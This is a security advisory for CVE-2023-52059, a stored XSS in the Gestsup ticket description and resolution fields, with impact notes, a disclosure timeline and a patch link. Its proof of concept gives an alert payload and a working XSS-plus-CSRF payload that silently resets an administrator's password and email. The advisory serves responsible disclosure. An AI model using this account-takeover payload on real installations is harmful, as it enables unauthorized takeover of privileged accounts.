# CVE-2023-52059

## Summary

| ID                    | CVE-2023-52059                                           |
|-----------------------|----------------------------------------------------------|
| **Type**              | XSS                                                      |
| **Title**             | Stored XSS in ticket's description and resolution fields |
| **Product impacted**  | Gestsup                                                  |
| **Impacted version**  | < 3.2.46                                                 |
| **CVSS Score**        | 5.4                                                      |
| **Author**            | Sopalinge                                                |

## Description

A lack of user input back-end sanitization allows remote attackers to perform a stored Cross-Site Scripting (XSS) attack in Gestsup < 3.2.46.

When creating or editing a ticket, an unprivileged user is able to intercept and edit the `Description` and `Resolution` fields directly in the request to bypass front-end sanitization and store malicious HTML content.


## Impact

An unprivileged user is then able to execute script on any user's browser who are viewing the malicious ticket.

The session cookie has the HttpOnly attribute, which protects it from client-side extraction.

However, combined with [CVE-2023-52060](../CVE-2023-52060/README.md), it can be used to take over privileged accounts directly from the Gestsup application.


## Proof of concept
### XSS

In the `Description` or `Resolution` fields, the following payload can be injected in the intercepted request to pop an alert when any user view the malicious ticket :

```
<img src=x onerror="alert('XSS')" />
```



https://github.com/Tanguy-Boisset/CVE/assets/83412402/deacf3e8-8f6e-44b2-ba41-85b895f534c9



### XSS and CSRF

In the `Description` or `Resolution` fields, the following payload can be injected in the intercepted request to exploit [CVE-2023-52060](../CVE-2023-52060/README.md) to change the pasword, email and function of any user viewing the ticket :

```
<img src=x onerror="fetch('./index.php?page=admin/user&action=edit&userid=1&tab=infos', {method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'},body: 'attachment=0&language=fr_FR&profile=4&firstname=admin&lastname=&login=admin&password=admin&password2=admin&mail=admin@example.com&function=hacked&modify=modify'})" />
```



https://github.com/Tanguy-Boisset/CVE/assets/83412402/69514524-4530-47b6-907e-0b593bd4e691




## Timeline

- 24/12/2023 : Vulnerability discovered
- 24/12/2023 : Vendor contacted
- 25/12/2023 : Official fix published
- 25/01/2024 : CVE ID attributed
- ??/01/2024 : CVE publicly disclosed


## References

- [Gestsup website](https://gestsup.fr/index.php?page=home)
- [Fixing patch](https://gestsup.fr/index.php?page=download&channel=beta&version=3.2.46&type=patch)
